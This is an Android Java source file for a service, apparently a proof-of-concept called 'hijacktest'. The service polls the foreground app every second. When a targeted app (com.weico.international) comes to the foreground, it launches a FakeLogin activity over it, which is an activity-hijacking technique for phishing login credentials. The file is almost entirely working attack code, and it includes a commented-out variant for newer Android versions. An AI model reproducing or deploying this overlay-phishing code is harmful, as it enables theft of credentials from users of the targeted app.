package cn.nibius.hijacktest;

import android.app.ActivityManager;
import android.app.Service;
import android.app.usage.UsageEvents;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import java.util.HashMap;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class HijackService extends Service {
    public static boolean isHijacked = false;
    Timer timer = new Timer();

    TimerTask timerTask = new TimerTask() {
        @Override
        public void run() {
            String fa = getForegroundActivity();
            Log.i("nib", "run: " + fa);
            if (mVictims.containsKey(fa) && !isHijacked) {
                Intent dialogIntent = new Intent(getBaseContext(), mVictims.get(fa));
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                getApplication().startActivity(dialogIntent);
                isHijacked = true;
            }
        }
    };
    HashMap<String, Class<?>> mVictims = new HashMap<>();
    long delay = 1000, period = 1000;

    public HijackService() {
    }

    @Override
    public void onStart(Intent intent, int startid) {
        Log.i("nib", "service onStart: ");
        mVictims.put("com.weico.international", FakeLogin.class);
        timer.scheduleAtFixedRate(timerTask, delay, period);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public String getForegroundActivity() {
//        if (Build.VERSION.SDK_INT < 21) {
        ActivityManager mActivityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        if (mActivityManager.getRunningTasks(1) == null) {
            return null;
        }
        ActivityManager.RunningTaskInfo mRunningTask =
                mActivityManager.getRunningTasks(1).get(0);
        if (mRunningTask == null) {
            return null;
        }

        String activityName = mRunningTask.topActivity.getClassName();
        String packageName = mRunningTask.topActivity.getPackageName();
        return packageName;
//        } else {
//            UsageStatsManager usageStatsManager =
//                    (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
//            long ts = System.currentTimeMillis();
//            List<UsageStats> queryUsageStats =
//                    usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_BEST, 0, ts);
//            UsageEvents usageEvents = usageStatsManager.queryEvents(isInit ? 0 : ts - 5000, ts);
//            if (usageEvents == null) {
//                return null;
//            }
//
//
//            UsageEvents.Event event = new UsageEvents.Event();
//            UsageEvents.Event lastEvent = null;
//            while (usageEvents.getNextEvent(event)) {
//                // if from notification bar, class name will be null
//                if (event.getPackageName() == null || event.getClassName() == null) {
//                    continue;
//                }
//
//                if (lastEvent == null || lastEvent.getTimeStamp() < event.getTimeStamp()) {
//                    lastEvent = event;
//                }
//            }
//
//            if (lastEvent == null) {
//                return null;
//            }
//            return lastEvent.getPackageName();
//        }
    }
}
